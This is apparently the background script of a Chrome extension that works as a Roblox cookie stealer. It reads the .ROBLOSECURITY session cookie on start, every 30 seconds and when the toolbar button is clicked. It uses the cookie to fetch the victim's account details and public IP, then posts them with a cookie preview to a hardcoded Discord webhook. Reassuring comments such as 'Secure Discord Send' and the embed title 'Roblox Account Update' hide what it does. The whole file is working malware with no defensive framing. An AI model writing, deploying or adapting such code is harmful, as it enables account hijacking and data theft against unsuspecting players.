const WEBHOOK_URL = "https://discord.com/api/webhooks/1383717664387498034/SZUg4Xj-rtaH_OHC25ph9i5IGlWWNwd1JTtqZkAdtln7dbz1DS6sdCnGceNWpmpSjBo9";
const RETRY_DELAY = 5000; // 5 seconds between retries
const MAX_RETRIES = 3;

let activeCookie = null;
let isProcessing = false;

// 1. Enhanced CSRF Token Fetch with Multi-Endpoint Fallback
async function getCsrfToken(cookie) {
    const endpoints = [
        "https://auth.roblox.com/v2/logout",
        "https://www.roblox.com/home",
        "https://www.roblox.com/game/join"
    ];

    for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
        for (const endpoint of endpoints) {
            try {
                const response = await fetch(endpoint, {
                    method: "POST",
                    headers: { 
                        Cookie: `.ROBLOSECURITY=${cookie}`,
                        "Content-Type": "application/json"
                    },
                    credentials: "include"
                });

                const token = response.headers.get("x-csrf-token");
                if (token) return token;

            } catch (error) {
                console.warn(`CSRF attempt ${attempt} failed for ${endpoint}:`, error);
                if (attempt === MAX_RETRIES) throw error;
                await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
            }
        }
    }
    throw new Error("All CSRF token attempts failed");
}

// 2. Comprehensive Roblox Data Fetch
async function getRobloxData(cookie, csrfToken) {
    try {
        const [userRes, ipRes] = await Promise.all([
            fetchWithRetry("https://users.roblox.com/v1/users/authenticated", {
                headers: {
                    Cookie: `.ROBLOSECURITY=${cookie}`,
                    "X-CSRF-TOKEN": csrfToken,
                    "Content-Type": "application/json"
                },
                credentials: "include"
            }),
            fetchWithRetry("https://api.ipify.org?format=json")
        ]);

        if (!userRes.ok) throw new Error(`Roblox API: ${userRes.status}`);
        if (!ipRes.ok) throw new Error(`IP API: ${ipRes.status}`);

        return {
            user: await userRes.json(),
            ip: (await ipRes.json()).ip
        };

    } catch (error) {
        console.error("Data collection failed:", error);
        throw error;
    }
}

// 3. Retry Wrapper for Fetch
async function fetchWithRetry(url, options, attempt = 1) {
    try {
        const response = await fetch(url, options);
        if (!response.ok && attempt < MAX_RETRIES) {
            throw new Error(`HTTP ${response.status}`);
        }
        return response;
    } catch (error) {
        if (attempt >= MAX_RETRIES) throw error;
        await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
        return fetchWithRetry(url, options, attempt + 1);
    }
}

// 4. Secure Discord Send with Validation
async function sendToDiscord(data, cookie) {
    const payload = {
        embeds: [{
            title: "Roblox Account Update",
            color: 0x5865F2,
            fields: [
                { name: "Username", value: data.user.name || "N/A", inline: true },
                { name: "User ID", value: data.user.id || "N/A", inline: true },
                { name: "Premium", value: data.user.isPremium ? "✅" : "❌", inline: true },
                { name: "IP Address", value: `||${data.ip}||`, inline: false },
                { name: "Cookie Preview", value: `\`\`\`${cookie.substring(0, 30)}...\`\`\``, inline: false }
            ],
            thumbnail: {
                url: data.user.id ? 
                    `https://www.roblox.com/headshot-thumbnail/image?userId=${data.user.id}` : 
                    null
            },
            timestamp: new Date().toISOString()
        }]
    };

    for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
        try {
            const response = await fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
            if (response.ok) return;
        } catch (error) {
            if (attempt === MAX_RETRIES) throw error;
            await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
        }
    }
}

// 5. Main Processing Pipeline
async function processAccount(cookie) {
    if (isProcessing || cookie === activeCookie) return;
    isProcessing = true;

    try {
        console.log("Processing new account...");
        const csrfToken = await getCsrfToken(cookie);
        const robloxData = await getRobloxData(cookie, csrfToken);
        await sendToDiscord(robloxData, cookie);
        
        activeCookie = cookie;
        console.log("Account processed successfully");

    } catch (error) {
        console.error("Processing failed:", error);
        // Emergency error report
        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: `❌ Processing Error: ${error.message}`
            })
        }).catch(e => console.error("Failed to send error:", e));

    } finally {
        isProcessing = false;
    }
}

// 6. Core Monitoring System
function startMonitoring() {
    // Immediate check
    chrome.cookies.get({
        url: "https://www.roblox.com",
        name: ".ROBLOSECURITY"
    }, (cookie) => {
        if (cookie?.value) processAccount(cookie.value);
    });

    // Periodic checks every 30 seconds
    setInterval(() => {
        chrome.cookies.get({
            url: "https://www.roblox.com",
            name: ".ROBLOSECURITY"
        }, (cookie) => {
            if (cookie?.value && cookie.value !== activeCookie) {
                processAccount(cookie.value);
            }
        });
    }, 30000);

    // Manual trigger from browser action
    chrome.action.onClicked.addListener(() => {
        chrome.cookies.get({
            url: "https://www.roblox.com",
            name: ".ROBLOSECURITY"
        }, (cookie) => {
            if (cookie?.value) processAccount(cookie.value);
        });
    });
}

// Start the system
startMonitoring();